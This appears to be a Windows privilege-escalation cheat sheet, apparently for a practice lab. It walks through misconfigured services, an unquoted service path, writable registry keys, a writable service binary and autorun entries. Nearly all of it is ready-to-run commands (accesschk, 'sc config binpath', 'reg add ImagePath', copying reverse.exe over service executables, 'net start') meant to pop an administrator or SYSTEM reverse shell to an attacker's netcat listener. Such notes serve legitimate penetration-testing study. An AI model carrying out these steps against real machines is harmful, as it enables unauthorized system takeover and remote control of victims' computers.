
Tools needed:
	Download AccessChk
		https://download.sysinternals.com/files/AccessChk.zip

[*] Insecure Service Perms
	Check services daclsvc:
		https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
		.\accesschk.exe /accepteula -uwcqv user daclsvc
	Query the Service Control config
		sc qc daclsvc # This is the name of the RW service
		sc config daclsvc binpath="\"C:\Path\To\reverse.exe""
	Start the service with a netcat listener started on attacker machine. This should pop an admin shell.
		net start daclsvc
	Keep in mind, you may need to run this from CMD, powershell gets weird with this.

[*] Unquoted Service Path
	check service unquotedsvc:
		sc qc unquotedsvc
			RW on Authority\System
		copy C:\Path\to\reverseshell.exe "C:\Program Files\Unquoted Path Service\Common.exe"
		net start unquotedsvc
			reverse shell should be System user
[*] Weak Registry Permissions
	Notice SYSTEM privs (LocalSystem):)
		sc qc regsvc
		.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc # Notice everyone has RW
	Overwrite the file with a reverse shell:
		reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
		net start regsvc
[*] Insecure Service Executable
	Notice the BINARY_PATH_NAME file is writeable by anyone
		sc qc filepermsvc
	Overwrite the file with a reverse shell and restart service
		.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
		copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
		net start filepermsvc
[*] Registry - AutoRuns
	Query an executable autorun
		reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
	
